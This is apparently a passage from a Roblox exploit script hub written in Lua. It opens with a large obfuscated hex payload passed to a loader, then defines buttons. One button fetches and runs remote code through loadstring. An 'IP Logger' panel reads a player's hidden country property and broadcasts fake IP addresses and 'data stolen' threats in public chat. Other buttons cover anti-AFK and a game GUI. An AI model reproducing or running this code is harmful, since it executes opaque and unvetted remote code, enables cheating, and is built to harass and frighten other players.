GameOverAgainlIlli1iIll1IlI111IlIi("LPH|D3E2332E8652013G0089D22805043G0045A0380C4G000267FC67F74CDCA465534A55103736009C830A02005D053G003GD38C945D0B3G003GD39BB6B2B780BAA9B6825G00E494405D033G003GD316010A9G009G005G000B9G002G000B3G000C3G00840A02002G1DE362E0E2E0623GE2BAE03GE22G1DE3622GE2E63GE2E062E0E2E6E22GE3E6FE694ACB847C3C25D36282F4C88478FBC7BB6458D7FBE248A318943AF820CD31848C1E00394G0002D33B9A853D5D8195540684A8ED5B0063830A02005D053G003GD38C945D083G003GD390BCBFBCA1825G00E494405D033G003GD358010A7G00109G006G000F9G002G000F7G00830A02002GE2E062694ACB84E3E2E0623GE2BAE05GE2E63GE2E062E0E2E6E22GE3E6FE141DE3629118B9CC4420CBE62D4BD7B7BAEF40D99876FCEC95ABA0FE19BF797D4G000B399046D8470F27157EC001BB5C33009B920A02005D053G003GD38C945D0B3G003GD397BAA0B2B1BFB6B7725D073G003GD3BDB6ABA75D073G003GD3B4B2BEB65D0D3G003GD394B6A780B6A1A5BAB0B65D0A3G003GD383BFB2AAB6A1A05D0D3G003GD394B6A783BFB2AAB6A1A05D073G003GD39DB2BEB65D0E3G003GD39FBCB0B2BF83BFB2AAB6A15D0C3G003GD390BBB2A1B2B0A7B6A15D133G003GD39BA6BEB2BDBCBAB7812GBCA783B2A1A75D0F3G003GD387A1B2BDA0A3B2A1B6BDB0AA826G00F03F5D073G003GD380BAA9B65D0A3G003GD385B6B0A7BCA1E05D063G003GD3BDB6A4827G00405D033G003GD3DD01647G00229G002G001C3G001C9G002G001D9G002G001D9G006G00199G002G00193G001B9G002G001B9G006G001B3G001B9G002G001B9G002G001E3G001E3G001B9G002G001F9G006G001C3G001C9G009G005G001E9G002G001E7G001B3G001C9G002G001C7G001B9G002G001B7G001E9G006G00189G002G00183G00199G002G00199G006G001E9G002G001E3G001E3G001E9G009G001G001C9G002G001C9G002G001C3G001D9G002G00DD0A0200C9E2E062694ACB842GE2E062ADE3FEAAE1E6FECEE5F0FC82B2E2E062EFE2FAE2E4F4F8822GE2E062EFE2FAE2EEF9F8FED1E2E0622GE2E062EFE2E6E2E3E6E0DA2GE2E0622GE2E0620F1DE362E1E2E63GE2E062EFE2E6E2E6E2EAE2E3E2E0622G1DE362EFE2EAE2E02GE866E4E2F26A2GE2E062378457E9E1E6EACEF9E2E06295E3FEAA2GE6FECEECEDFAFE4D2E5BC02GE2E062381DE362EDE2E0623A1DE3622GE2E062EFE2FEE2E5E8FC66E4E2C66A361DE362F4E2E0623GE2BAEF3GE2F1E2E062E4F4F8822GE2E062EFE2FAE2EDE2FEE2F5E2E062091DE362E7F2F8822GE2E062EFE2FAE2E6E2FEE2091DE362E0ECE8662GE2E06238E3EAAAE0E4EACE161DE362E7F6F8820F1DE362EFE2FAE2091DE3622GE2E63GE2E062EFE2E6E22GE3E6FE2GE2E63GE2E062EFE2E6E2E3E0E4825C1DE3622GE2E062EFE2FEE2E5C2FC822GE2E062EFE2FEE2F3E2C26AF3E2C66AEFE2CA6A2B1DE362251DE3622GE2E062EFE2FEE2E5F2FC822GE2E062EFE2FEE2E4ECE6DA2GE2E0622GE2E062231DE362E7F6F882461DE362401DE362E34E88DDD172BDEE75129BCEA81257868CADBCF5782282BBD7B15F3F013G007A12E2174G0005488E6EF65D3571086EEA4D9ADC6501C08F0A02005D0C3G003GD390BBB2A1B2B0A7B6A15D133G003GD39BA6BEB2BDBCBAB7812GBCA783B2A1A75D073G003GD380BAA9B65D0A3G003GD385B6B0A7BCA1E05D063G003GD3BDB6A45D053G003GD38C945D0B3G003GD39BB6B2B780BAA9B65D0F3G003GD387A1B2BDA0A3B2A1B6BDB0AA826G66E63F5D0D3G003GD391A1BAB0B890BCBFBCA15D083G003GD390BCBFBCA15D0B3G003GD39EB2A7B6A1BAB2BF5D073G003GD39DB6BCBD5D0D3G003GD390B2BD90BC2GBFBAB7B6725D033G003GD3DA00727G00299G009G001G002B9G002G002B9G002G00299G006G002E3G00293G00293G002A9G002G002A9G002G002A9G002G002B3G002B3G002C9G002G002C9G009G005G002B9G009G005G00297G00299G002G00299G002G00299G006G002C9G002G002C3G002D9G002G002D9G006G002B9G009G009G002A3G002B9G002G002B9G002G002B9G006G002D9G002G002D7G00299G002G00299G006G00299G009G009G004G00299G009G001G00299G002G00EC0A0200CAE2E062E7E2EAE2EAE2E062EAE2EAE2E4E2E062EA4GE22GE0822GE2E062EA3GE2EBE2E6E2A1E2E062A3E2E062E0EEE882AEE2E062EAE2EAE2A8E2E062694ACB843GE6CEE0E1E2FE96FE33EB2GE2E062EA5GE2E0822GE2E062EA4GE22GE082CFE2E0627BE3E6AAE02GE6CEEBE1E2FE96FE33EB2GE2E062EA5GE2E082F7E2E062EA3GE2F1E2E0622GE2E062EA5GE2E0823E1DE362381DE362E3E2E0623GE2BAEA3GE296FE33EBDAE2E062E22GE0822GE2E062EA3GE2E1E2E63GE2E062EAE2E6E2E3EAE4822B1DE362EAE2E6E2251DE362E22GE0822GE2E062EA3GE2E9FBE0FE96FE33EB2GE2E062EA5GE2E082F3E2E0622GE2E062EAE2EAE2E0F6E882371DE362EAE2EAE2311DE362331DE3622GE2E062EA3GE2E5F3E0FE96FE33EB341DE362EAE2E6E2E3EAE4822GE2E062EAE2E6E2E7E2EAE20F1DE3622GE2E062EA4GE22GE0822GE2E062EA3GE2EFFFE0FE561DE362E7E2EE3GE2E062EAE2EEE2E1EEEC82ECE2E062EEE2E062EAE2F2E2E6EEF0824E1DE362EAE2F2E2481DE362B9E3E6AA4A1DE3622GE2E062EA5GE2E082201DE362EA3GE2221DE362EAE2EEE2E7E2F2E2121DE3620C1DE362833C28F12C2E70887E626FE36F6938B7AA050E9976BD276AD692959F09C64E64EA77B9361465DD774A547900688B0A02005D053G003GD38C945D0B3G003GD397BAA0B2B1BFB6B75D073G003GD3BDB6ABA75D073G003GD3B4B2BEB65D0D3G003GD394B6A780B6A1A5BAB0B65D0A3G003GD383BFB2AAB6A1A05D0D3G003GD394B6A783BFB2AAB6A1A05D073G003GD39DB2BEB65D0E3G003GD39FBCB0B2BF83BFB2AAB6A15D083G003GD3A3B0B22GBF825G00E494405D033G003GD3F500499G002G00263G00269G002G00269G002G00279G002G00279G002G00273G00289G002G00259G002G00253G00269G002G00269G002G00329G002G002E3G002E9G002G00283G002F3G00269G002G002F9G009G001G00259G002G00259G002G00273G00279G002G00273G00279G002G00279G002G00279G006G00269G002G00263G00267G00C30A0200CBE2E062E8E2E6E2E3EAE466E7E2EE6A2GE2E06218E3E6AAE12GE6CED8E2E062E8E2FAE2E4ECF8822GE2E062E8E2FAE2E7EEE6DA2GE2E0622GE2E062F6E2E062EBE2F6E2E9E2E062E83GE22F30D6B12GE2E0622GE2E062E7E2E062E05GE2E062E83GE2E1E2E6E2071DE362011DE362694ACB842GE2E062E8E2F63GE2FABAE62GE29A2GE2E062118423E92GE0F6CEADE4AA8F4D2E57C02GE2E062111DE362F3E2E062131DE362E3E2E062E32GE2BAE89GE2E062E84GE22GE0823D1DE3623F1DE362E4EAF866E7E2C26A2GE2E0626C8427E9E1E6FACEE4F2F8822F1DE362291DE362E6ECF4822GE2E062E8E2F6E2E1E2FAE2101DE362E8E2FAE2121DE362E3EEE4662GE2E0624E8453E9E0E4E6CE3F1DE362101DE362B98CF2F7E4D86AC5FD175DB1089873C276D700AF594C1EA687D34CDD0AF4ECD2AD0561B8903EF0D737E30D00B4A40A02005D0D3G003GD3BFBCB2B7A0A7A1BABDB45D073G003GD3B4B2BEB65D0A3G003GD39B2GA7A394B6A75D243G003GD3BB2GA7A3A0E92GFCA3B2A0A7B6B1BABDFDB0BCBEFCA1B2A4FCABA387E7E5A6B0865D063G003GD3BDB6A45D123G003GD39BBAA7B1BCABF396ABA3B2BDB7B6A15D083G003GD38697BABEE1828G00826G007940825G00C072405D123G003GD390BBB2BDB4B687BC2GB4BFB698B6AA5D073G003GD396BDA6BE5D0A3G003GD398B6AA90BCB7B65D093G003GD39ABDA0B6A1A75D0B3G003GD390B2A7B6B4BCA1AA5D093G003GD39BBAA7B1BCAB5D093G003GD380B6B0A7BCA15D083G003GD390BBB6B2A75D093G003GD380BFBAB7B6A15D0E3G003GD39BBAA7B1BCABF380BAA9B65D063G003GD3BEBABD826G0024405D063G003GD3BEB2AB826G004E405D093G003GD3A0A62GB5BAAB5D083G003GD3F380BAA9B65D0F3G003GD39BBAA7B1BCABF390BCBFBCA1825G00488F40825G00E88F405D093G003GD3F390BCBFBCA15D0B3G003GD390BBB6B0B8B1BCAB5D113G003GD39BBAA7B1BCABF396BDB2B1BFB6B75D0D3G003GD394B6A780B6A1A5BAB0B65D0D3G003GD381A6BD80B6A1A5BAB0B65D103G003GD381B6BDB7B6A180A7B62GA3B6B75D0A3G003GD3B0BC2GBDB6B0A75D033G003GD37A00839G002G00029G002G00023G00023G00023G00029G006G00037G000E3G000E3G000E9G006G00073G000A3G000A3G000A3G000C3G000C3G000C7G00039G002G00039G002G00039G009G005G00033G00049G002G00013G00019G002G00019G009G001G00019G002G00019G009G001G00029G002G00029G006G00247G000E3G00143G00153G00163G00229G002G00143G00249G002G00243G00323G000C3G000C9G002G000A9G006G00243G00247G00249G002G00243G00329G002G00049G002G00043G00073G00077G00103G00103G00103G00103G00109G009G005G00023G00023G00029G009G001G00019G002G00013G00027G00FF0A0200D2E2E062E5E2F2E2E6EAF0822GE2E062E5E2F2E2E5E2F66AEAE2FA6AE5E2FE6AEBE2C26AD2E2E0622GE2E062E5E2EEE2E1F8EC82F7E2E062E1C0F066F0E2FA6AF8E2FE6ABBE2E0622GE2E06240E3EEAAE1E6EECEE1C0F066F0E2FA6AF1E2FE6A2GE2C2BAE2E4C6D6F6C9C4FED4E2E062E3F6E8822GE2E062E5E2EAE2E9E2EE3GE2E062E5E2EEE2E1FAEC82071DE362E0E2E062E5E2EE3GE2E0622C8457E92GE0EACEE3FEE866DBE2E062E5E2E6E2E3E6E466E1E2EE6A2GE2E062F08453E9E1E2E6CEAAE2E062E3E2E062E62GE2BAE59GE2E062E53GE2E3E2E6E2131DE3620D1DE3622GE2E06241E3F2AAE7E2F2CE2GE2E062CE8453E9E22GE6CE3B1DE3622GE2E062DBE3F2AAE1E6F2CEF5E2E062E4E0F2CEE1C0F066FCE2FA6AFDE2FE6AE0E2C2BA2GE2E062A8845FE9E7E0F2CEE3E2F2E2EAE2E062DAE3F2AAE1E0F2CE694ACB84F4CDC4FEFAD1C4FE2GE2E06268E3F2AAE4E0F2CE561DE3622GE2E062E5E2F2E2E6A2F066C3E2FA6A011DE362E6A6F0822GE2E062E5E2F2E2E6A4F066E1E2FABA0E1DE362081DE362EDE2F26A2GE2E0626FE3EAAAE1E6EACEE0C2EC66E7E2F66A471DE362E3E2C2BAE2E4C6D6F6D5C4FEF4DBC4FEFAD9C4FE311DE36225845FE9331DE3622GE2E062E5E2E6E2E3E2EAF6E7E2EE6AE4E2F2E2651DE362671DE3622GE2E062FCE3E2AAE2E6E2CE2GE2E062F9E3E2AAE3E6E2CEE2EAE482121DE362453F5DD8FC39EACFC74166B5775C1261CDF95793EA30A09748231FE3596121BD3BE47E8E002BC97A442E76CFDB4DE265F8B50F006D800A0200825G00E49440995G007A0A02002GE2E062E32GE2BA3GE2BA3GE28A4GE2E32GE2CE3GE2AE", GameOverAgainlilIIii1lIlIiIiI11i())
end)

local InfiniteYield = ScriptsTab.AddButton("Infinite Yield", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end)

local IPlogger = ScriptsTab.AddButton("IP Logger", function()
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("ImageLabel")
local TextLabel = Instance.new("TextLabel")
local TextLabel_2 = Instance.new("TextLabel")
local close = Instance.new("TextButton")
local TextLabel_3 = Instance.new("TextLabel")
local TextLabel_4 = Instance.new("TextLabel")
local username = Instance.new("TextBox")
local snatch = Instance.new("TextButton")
local TextButton_Roundify_12px = Instance.new("ImageLabel")
local miscbut = Instance.new("TextButton")
local MISC = Instance.new("ImageLabel")
local TextLabel_5 = Instance.new("TextLabel")
local TextLabel_6 = Instance.new("TextLabel")
local snatchall = Instance.new("TextButton")
local TextButton_Roundify_12px_2 = Instance.new("ImageLabel")
local TextLabel_7 = Instance.new("TextLabel")
Frame.Draggable = true
Frame.Active = true
Frame.Selectable = true
local sound = Instance.new("Sound")
sound.Parent = workspace
sound.SoundId = "rbxassetid://5292029547"
sound:Play()

--Properties:

ScreenGui.Parent = game.CoreGui

Frame.Name = "Frame"
Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.BackgroundTransparency = 1.000
Frame.Position = UDim2.new(0.152727276, 0, 0.277641267, 0)
Frame.Size = UDim2.new(0, 0, 0, 0)
Frame.ZIndex = 3
Frame.Image = "rbxassetid://3570695787"
Frame.ImageColor3 = Color3.fromRGB(20, 20, 20)
Frame.ScaleType = Enum.ScaleType.Slice
Frame.SliceCenter = Rect.new(100, 100, 100, 100)
Frame.SliceScale = 0.120
Frame.ClipsDescendants = true

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(0.026143793, 0, 0.0232558139, 0)
TextLabel.Size = UDim2.new(0, 22, 0, 24)
TextLabel.ZIndex = 3
TextLabel.Font = Enum.Font.SourceSansBold
TextLabel.Text = "IP"
TextLabel.TextColor3 = Color3.fromRGB(255, 85, 0)
TextLabel.TextSize = 25.000

TextLabel_2.Parent = Frame
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.Position = UDim2.new(0.0980392173, 0, 0.0232558139, 0)
TextLabel_2.Size = UDim2.new(0, 102, 0, 24)
TextLabel_2.ZIndex = 3
TextLabel_2.Font = Enum.Font.SourceSansBold
TextLabel_2.Text = "LOGGER"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextSize = 25.000

close.Name = "close"
close.Parent = Frame
close.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
close.BackgroundTransparency = 1.010
close.Position = UDim2.new(0.934640527, 0, 0.0232558139, 0)
close.Size = UDim2.new(0, 20, 0, 20)
close.ZIndex = 3
close.Font = Enum.Font.SourceSansBold
close.Text = "X"
close.TextColor3 = Color3.fromRGB(255, 0, 0)
close.TextScaled = true
close.TextSize = 14.000
close.TextWrapped = true

TextLabel_3.Parent = Frame
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.BackgroundTransparency = 1.000
TextLabel_3.Position = UDim2.new(7.4505806e-09, 0, 0.860465109, 0)
TextLabel_3.Size = UDim2.new(0, 214, 0, 24)
TextLabel_3.ZIndex = 3
TextLabel_3.Font = Enum.Font.SourceSansBold
TextLabel_3.Text = "Gui & Code Remade: fixed#8267"
TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.TextSize = 15.000

TextLabel_4.Parent = Frame
TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4.BackgroundTransparency = 1.000
TextLabel_4.Position = UDim2.new(0, 0, 0.767441869, 0)
TextLabel_4.Size = UDim2.new(0, 240, 0, 24)
TextLabel_4.ZIndex = 3
TextLabel_4.Font = Enum.Font.SourceSansBold
TextLabel_4.Text = "Gui & Code Revamp: Univrs#7207"
TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4.TextSize = 15.000

username.Name = "username"
username.Parent = Frame
username.BackgroundColor3 = Color3.fromRGB(255, 128, 0)
username.BackgroundTransparency = 1.000
username.BorderSizePixel = 0
username.Position = UDim2.new(0.173202619, 0, 0.313953489, 0)
username.Size = UDim2.new(0, 200, 0, 24)
username.ZIndex = 3
username.Font = Enum.Font.GothamBold
username.PlaceholderColor3 = Color3.fromRGB(178, 178, 178)
username.PlaceholderText = "Input User"
username.Text = ""
username.TextColor3 = Color3.fromRGB(255, 255, 255)
username.TextSize = 14.000

snatch.Name = "LogFakeIp"
snatch.Parent = Frame
snatch.BackgroundColor3 = Color3.fromRGB(255, 128, 0)
snatch.BackgroundTransparency = 1.000
snatch.BorderSizePixel = 0
snatch.Position = UDim2.new(0.205882356, 0, 0.511627913, 0)
snatch.Size = UDim2.new(0, 180, 0, 28)
snatch.ZIndex = 4
snatch.Font = Enum.Font.SourceSansBold
snatch.Text = "Take Ip"
snatch.TextColor3 = Color3.fromRGB(255, 255, 255)
snatch.TextScaled = true
snatch.TextSize = 14.000
snatch.TextWrapped = true
snatch.MouseButton1Down:connect(function()
local v = game.Players[username.Text]
ass = gethiddenproperty or get_hidden_prop
    local Thing = game:GetService("HttpService"):JSONDecode(game:HttpGet("http://country.io/names.json"))
    local ParsedCountry = Thing[ass(v, "CountryRegionCodeReplicate")]
    local SayMessageRequest1 = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
SayMessageRequest1:FireServer(
v.Name.." - Cracking IP Address...",
"All"
)
wait(2)
   local SayMessageRequest = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
SayMessageRequest:FireServer(
v.Name.." is from "..tostring(ParsedCountry).." OS: "..v.OsPlatform.." IP: "..math.random(836).."."..math.random(725).."."..math.random(99)..".".."##".." ".."(IP: Successfully Logged)",
"All"
)
wait(0.55)
 local SayMessageRequest2 = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
SayMessageRequest2:FireServer(
v.Name.."'s Data Has Been Successfully Stolen.",
"All"
)

end)

TextButton_Roundify_12px.Name = "TextButton_Roundify_12px"
TextButton_Roundify_12px.Parent = snatch
TextButton_Roundify_12px.Active = true
TextButton_Roundify_12px.AnchorPoint = Vector2.new(0.5, 0.5)
TextButton_Roundify_12px.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_Roundify_12px.BackgroundTransparency = 1.000
TextButton_Roundify_12px.Position = UDim2.new(0.5, 0, 0.5, 0)
TextButton_Roundify_12px.Selectable = true
TextButton_Roundify_12px.Size = UDim2.new(1, 0, 1, 0)
TextButton_Roundify_12px.ZIndex = 3
TextButton_Roundify_12px.Image = "rbxassetid://3570695787"
TextButton_Roundify_12px.ImageColor3 = Color3.fromRGB(255, 128, 0)
TextButton_Roundify_12px.ScaleType = Enum.ScaleType.Slice
TextButton_Roundify_12px.SliceCenter = Rect.new(100, 100, 100, 100)
TextButton_Roundify_12px.SliceScale = 0.120

miscbut.Name = "miscbut"
miscbut.Parent = Frame
miscbut.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
miscbut.BackgroundTransparency = 1.010
miscbut.Position = UDim2.new(0.934640527, 0, 0.883720934, 0)
miscbut.Size = UDim2.new(0, 20, 0, 20)
miscbut.ZIndex = 3
miscbut.Font = Enum.Font.SourceSansBold
miscbut.Text = ">"
miscbut.TextColor3 = Color3.fromRGB(255, 255, 255)
miscbut.TextScaled = true
miscbut.TextSize = 14.000
miscbut.TextWrapped = true

MISC.Name = "MISC"
MISC.Parent = Frame
MISC.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MISC.BackgroundTransparency = 1.000
MISC.Position = UDim2.new(0.0775638819, 0, 0.0725949258, 0)
MISC.Size = UDim2.new(0, 262, 0, 147)
MISC.ZIndex = 0
MISC.Image = "rbxassetid://3570695787"
MISC.ImageColor3 = Color3.fromRGB(20, 20, 20)
MISC.ScaleType = Enum.ScaleType.Slice
MISC.SliceCenter = Rect.new(100, 100, 100, 100)
MISC.SliceScale = 0.120

TextLabel_5.Parent = MISC
TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_5.BackgroundTransparency = 1.000
TextLabel_5.Position = UDim2.new(0.02614378, 0, 0.0232981984, 0)
TextLabel_5.Size = UDim2.new(0, 18, 0, 20)
TextLabel_5.Font = Enum.Font.SourceSansBold
TextLabel_5.Text = "MI"
TextLabel_5.TextColor3 = Color3.fromRGB(255, 85, 0)
TextLabel_5.TextSize = 25.000

TextLabel_6.Parent = MISC
TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_6.BackgroundTransparency = 1.000
TextLabel_6.Position = UDim2.new(0.0980392322, 0, 0.0232981984, 0)
TextLabel_6.Size = UDim2.new(0, 28, 0, 20)
TextLabel_6.Font = Enum.Font.SourceSansBold
TextLabel_6.Text = "SC"
TextLabel_6.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_6.TextSize = 25.000

snatchall.Name = "logserver"
snatchall.Parent = MISC
snatchall.BackgroundColor3 = Color3.fromRGB(255, 128, 0)
snatchall.BackgroundTransparency = 1.000
snatchall.BorderSizePixel = 0
snatchall.Position = UDim2.new(0.0493937507, 0, 0.703036785, 0)
snatchall.Size = UDim2.new(0, 236, 0, 23)
snatchall.ZIndex = 2
snatchall.Font = Enum.Font.SourceSansBold
snatchall.Text = "Log Server"
snatchall.TextColor3 = Color3.fromRGB(255, 255, 255)
snatchall.TextScaled = true
snatchall.TextSize = 14.000
snatchall.TextWrapped = true
snatchall.MouseButton1Down:connect(function()
--[[https://v3rmillion.net/showthread.php?tid=1012504, In-Chat Player Real Country Fake IP leaker by kuraga.
]]
-- CREDITS TO kuraga#4659 AND DerzeTT#8830
ass = gethiddenproperty or get_hidden_prop

for _,v in pairs(game:GetService("Players"):GetPlayers()) do
   if v.Name ~= game:GetService("Players").LocalPlayer.Name then
    local Thing = game:GetService("HttpService"):JSONDecode(game:HttpGet("http://country.io/names.json"))
    local ParsedCountry = Thing[ass(v, "CountryRegionCodeReplicate")]
   local SayMessageRequest = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
SayMessageRequest:FireServer(
v.Name.." is from "..tostring(ParsedCountry).." OS: "..v.OsPlatform.." IP: "..math.random(728).."."..math.random(326).."."..math.random(99)..".".."##".." ".."(IP: Successfully Logged)",
"All"
)
wait(2)
end
end
for i = 1,5 do
local SayMessageRequest1 = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
SayMessageRequest1:FireServer(
"Program Status: Cracking...",
"All"
)
wait(1)
end
wait(5)
local SayMessageRequest2 = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
SayMessageRequest2:FireServer(
"Program Status: Successfully Stolen Addresses, Data Being Sold To [%Encryped Site%]",
"All"
)
end)

TextButton_Roundify_12px_2.Name = "TextButton_Roundify_12px"
TextButton_Roundify_12px_2.Parent = snatchall
TextButton_Roundify_12px_2.Active = true
TextButton_Roundify_12px_2.AnchorPoint = Vector2.new(0.5, 0.5)
TextButton_Roundify_12px_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_Roundify_12px_2.BackgroundTransparency = 1.000
TextButton_Roundify_12px_2.Position = UDim2.new(0.5, 0, 0.5, 0)
TextButton_Roundify_12px_2.Selectable = true
TextButton_Roundify_12px_2.Size = UDim2.new(1, 0, 1, 0)
TextButton_Roundify_12px_2.Image = "rbxassetid://3570695787"
TextButton_Roundify_12px_2.ImageColor3 = Color3.fromRGB(255, 128, 0)
TextButton_Roundify_12px_2.ScaleType = Enum.ScaleType.Slice
TextButton_Roundify_12px_2.SliceCenter = Rect.new(100, 100, 100, 100)
TextButton_Roundify_12px_2.SliceScale = 0.120

TextLabel_7.Parent = MISC
TextLabel_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_7.BackgroundTransparency = 1.000
TextLabel_7.Position = UDim2.new(0.0980392322, 0, 0.213774383, 0)
TextLabel_7.Size = UDim2.new(0, 212, 0, 62)
TextLabel_7.Font = Enum.Font.SourceSansBold
TextLabel_7.Text = "Holy fuck some people are annoying"
TextLabel_7.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_7.TextScaled = true
TextLabel_7.TextSize = 25.000
TextLabel_7.TextWrapped = true

-- Scripts:

local function XHSJL_fake_script() -- close.LocalScript 
	local script = Instance.new('LocalScript', close)

	close.MouseButton1Down:Connect(function()
	    MISC:TweenPosition(UDim2.new(0.078, 0, 0.073, 0), 'Out', 'Bounce', 0.35)
			wait(.35)
	    Frame.ClipsDescendants = true
		Frame:TweenSize(UDim2.new(0,0,0,0), 'Out', 'Linear', .3)
		wait(.3)
		ScreenGui:Destroy()
	end)
end
coroutine.wrap(XHSJL_fake_script)()
local function MOOLDA_fake_script() -- miscbut.LocalScript 
	local script = Instance.new('LocalScript', miscbut)

	local t = false
	miscbut.MouseButton1Down:Connect(function()
		if (t == false) then
			MISC:TweenPosition(UDim2.new(1.051, 0, 0.073, 0), 'Out', 'Bounce', 0.35)
			wait(.35)
			t = true
		elseif (t == true) then
			MISC:TweenPosition(UDim2.new(0.078, 0, 0.073, 0), 'Out', 'Bounce', 0.35)
			wait(.35)
			t = false
		end
	end)
end
coroutine.wrap(MOOLDA_fake_script)()
Frame:TweenSize(UDim2.new(0, 306, 0, 172), 'Out', 'Linear', 0.3)
wait(.3)
Frame.ClipsDescendants = false
end)

local CtrlToShiftlock = ScriptsTab.AddButton("Ctrl To Shiftlock", function()
repeat wait() until game:IsLoaded()
--game:GetService("Players").0e4k.PlayerScripts.PlayerModule.CameraModule.MouseLockController.BoundKeys
local keys = game.Players.LocalPlayer.PlayerScripts.PlayerModule.CameraModule.MouseLockController:WaitForChild("BoundKeys")
local Key = "LeftControl" -- Customizable Key
keys.Value = Key
end)

local LuckyBlocks = ScriptsTab.AddButton("Lucky Blocks Battlegrounds", function()
local vu = game:GetService("VirtualUser")
game:GetService("Players").LocalPlayer.Idled:connect(function()
    vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
    wait(1)
    vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
end)
 
game.StarterGui:SetCore("SendNotification", {
    Title = "LUCKY BLOCKS Battlegrounds";
    Text = "Made by MaGiXx"; -- what the text says (ofc)
    Duration = 5;
})
wait(1)
game.StarterGui:SetCore("SendNotification", {
    Title = "Anti-Afk";
    Text = "Enabled!"; -- what the text says (ofc)
    Duration = 5;
})
 
local LuckyBlock = Instance.new("ScreenGui")
local Frame = Instance.new("ImageLabel")
local title = Instance.new("TextLabel")
local Frame_HUB = Instance.new("ImageLabel")
local HUB = Instance.new("TextLabel")
local Main = Instance.new("Frame")
local LuckyBlock_2 = Instance.new("TextButton")
local SuperBlock = Instance.new("TextButton")
local GalaxyBlock = Instance.new("TextButton")
local RainbowBlock = Instance.new("TextButton")
local DiamondBlock = Instance.new("TextButton")
local CopyDiscordServer = Instance.new("TextButton")
local DiscordServer_box = Instance.new("TextBox")
local lable_discord = Instance.new("TextLabel")
local open_box = Instance.new("TextBox")
local toBox = Instance.new("TextLabel")
local Frame_2 = Instance.new("Frame")
local close = Instance.new("ImageButton")
 
--Properties:
 
LuckyBlock.Name = "LuckyBlock"
LuckyBlock.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
LuckyBlock.ResetOnSpawn = false
 
Frame.Name = "Frame"
Frame.Parent = LuckyBlock
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.BackgroundTransparency = 1.000
Frame.ClipsDescendants = true
Frame.Position = UDim2.new(0.304542094, 0, 0.326781332, 0)
Frame.Size = UDim2.new(0, 525, 0, 300)
Frame.Image = "rbxassetid://3570695787"
Frame.ImageColor3 = Color3.fromRGB(0, 0, 0)
Frame.ScaleType = Enum.ScaleType.Slice
Frame.SliceCenter = Rect.new(100, 100, 100, 100)
Frame.SliceScale = 0.120
Frame.Active = true
Frame.Draggable = true
 
title.Name = "title"
title.Parent = Frame
title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
title.BackgroundTransparency = 1.000
title.Size = UDim2.new(0, 439, 0, 51)
title.Font = Enum.Font.SourceSans
title.Text = "LuckyBlock"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextSize = 28.000
 
Frame_HUB.Name = "Frame_HUB"
Frame_HUB.Parent = Frame
Frame_HUB.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame_HUB.BackgroundTransparency = 1.000
Frame_HUB.BorderColor3 = Color3.fromRGB(255, 255, 255)
Frame_HUB.Position = UDim2.new(0.531428576, 0, 0.0277550742, 0)
Frame_HUB.Size = UDim2.new(0, 81, 0, 33)
Frame_HUB.Image = "rbxassetid://3570695787"
Frame_HUB.ImageColor3 = Color3.fromRGB(255, 170, 0)
Frame_HUB.ScaleType = Enum.ScaleType.Slice
Frame_HUB.SliceCenter = Rect.new(100, 100, 100, 100)
Frame_HUB.SliceScale = 0.120
 
HUB.Name = "HUB"
HUB.Parent = Frame_HUB
HUB.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
HUB.BackgroundTransparency = 1.000
HUB.Position = UDim2.new(0, 0, -0.00494801067, 0)
HUB.Size = UDim2.new(0, 81, 0, 33)
HUB.Font = Enum.Font.SourceSans
HUB.Text = "HUB"
HUB.TextColor3 = Color3.fromRGB(0, 0, 0)
HUB.TextScaled = true
HUB.TextSize = 14.000
HUB.TextWrapped = true
 
Main.Name = "Main"
Main.Parent = Frame
Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Main.BorderColor3 = Color3.fromRGB(255, 255, 255)
Main.Position = UDim2.new(-0.034285713, 0, 0.170000002, 0)
Main.Size = UDim2.new(0, 559, 0, 0)
 
LuckyBlock_2.Name = "LuckyBlock"
LuckyBlock_2.Parent = Frame
LuckyBlock_2.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
LuckyBlock_2.BorderSizePixel = 0
